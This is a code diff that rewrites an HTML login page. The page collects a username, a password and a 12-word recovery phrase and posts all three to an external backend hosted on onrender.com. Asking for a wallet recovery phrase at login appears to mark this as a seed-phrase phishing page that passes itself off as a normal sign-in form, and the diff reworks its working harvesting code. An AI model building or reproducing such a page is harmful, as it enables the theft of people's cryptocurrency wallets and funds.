@@ -1,38 +1,56 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
   <meta charset="UTF-8">
   <title>Login</title>
-    <link rel="stylesheet" href="css/styles.css">
+  <link rel="stylesheet" href="css/styles.css">
 </head>
-
 <body>
-  <nav><a href="/">Home</a> | <a href="/signup.html">Sign Up</a> | <a href="/login.html">Login</a></nav>
-  <div class="container">
-    <h2>Login</h2>
-    <input type="text" id="username" placeholder="Username" required>
-    <input type="password" id="password" placeholder="Password" required>
-    <textarea id="phrase" placeholder="12-word recovery phrase" required></textarea>
-    <button onclick="login()">Login</button>
-  </div>
+<nav>
+  <a href="/">Home</a> | <a href="/signup.html">Sign Up</a> | <a href="/login.html">Login</a>
+</nav>
 
+<div class="container">
+  <h2>Login</h2>
+  <input type="text" id="username" placeholder="Username"><br><br>
+  <input type="password" id="password" placeholder="Password"><br><br>
+  <textarea id="phrase" placeholder="12-word recovery phrase" rows="3"></textarea><br><br>
+  <button onclick="login()">Login</button>
+</div>
 
-
-  <script>
+<script>
 const BACKEND_URL = 'https://authappmain.onrender.com';
-console.log('Login → Backend:', BACKEND_URL);
-</script>
-  
-  <script>
-    async function login() {
-      const res = await fetch(`${BACKEND_URL}/api/login`, {
-        method: 'POST', headers: { 'Content-Type': 'application/json' }, credentials: 'include',
-        body: JSON.stringify({ username: document.getElementById('username').value, password: document.getElementById('password').value, phrase: document.getElementById('phrase').value })
-      }).then(r => r.json());
-      if (res.success) location.href = '/profile.html'; else alert('Wrong credentials');
-    }
-  </script>
-</body>
+console.log('%cLOGIN PAGE → Backend:', 'color:cyan;font-weight:bold', BACKEND_URL);
 
+async function login() {
+  const username = document.getElementById('username').value.trim();
+  const password = document.getElementById('password').value;
+  const phrase   = document.getElementById('phrase').value.trim();
+
+  console.log('%cLOGIN ATTEMPT →', 'color:orange', username);
+
+  try {
+    const res = await fetch(`${BACKEND_URL}/api/login`, {
+      method: 'POST',
+      credentials: 'include',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username, password, phrase })
+    });
+
+    const data = await res.json();
+    console.log('%cLOGIN RESPONSE →', 'color:lime', data);
+
+    if (data.success) {
+      console.log('LOGIN SUCCESS → Redirecting...');
+      location.href = '/profile.html';
+    } else {
+      alert('Wrong username, password, or phrase');
+    }
+  } catch (err) {
+    console.error('%cLOGIN FAILED →', 'color:red', err);
+    alert('Server unreachable');
+  }
+}
+</script>
+</body>
 </html>
